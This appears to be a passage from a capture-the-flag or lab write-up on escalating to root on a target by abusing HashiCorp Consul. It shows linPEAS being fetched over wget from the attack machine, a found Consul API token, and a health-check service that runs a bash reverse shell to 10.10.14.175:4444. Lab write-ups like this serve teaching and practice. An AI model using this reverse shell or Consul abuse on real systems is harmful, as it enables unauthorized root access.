Now for the root flag, I usually use [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), a binary which enumerates vulnerabilities we can use in order to escalate privileges. So I will get `linpeas.sh` from my attack machine to the target with a python web server.

```bash
python3 -m http.server
```

On the target machine:

```bash
wget http://$ATTACKER:8000/linpeas.sh -O /tmp/linpeas.sh
```

Now we mark it as executable and execute it.

![peasconusl.png](../_resources/peasconusl.png)

We found some interesting files. Upon further manual inspection, I found that it is running Hashicorp Consul, which can be exploited through Metasploit(https://www.exploit-db.com/exploits/46074).

# How does the exploit work?

The exploit interacts with the consul restful API located at `localhost` on port `8500` by default

![localhost.png](../_resources/localhost.png)

A valid token can be found in `/opt/my-app`...

![git.png](../_resources/git.png)

... which could have been used to interact with consul key/value store. We try again using the token to get a valid response:

```bash
curl --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" http://127.0.0.1:8500/v1/agent/self
```

Now we can manually create and run a service for consul. Services have "health checks" which can run scripts and get us a privileged shell

https://developer.hashicorp.com/consul/docs/discovery/checks

![json.png](../_resources/json.png)

And we create `rev_shell.sh`, which will contain the commands to be executed by the service.

```bash
#!/bin/bash
bash -i &>/dev/tcp/10.10.14.175/4444 <&1
```

Finally we register the service...

![final.png](../_resources/final.png)

NOTE: service can be debugged using `curl --header "X-Consul-Token: <token>" http://127.0.0.1:8500/v1/agent/health/service/id/<service_id>`

![root.png](../_resources/root.png)

...and get a root shell on the other side.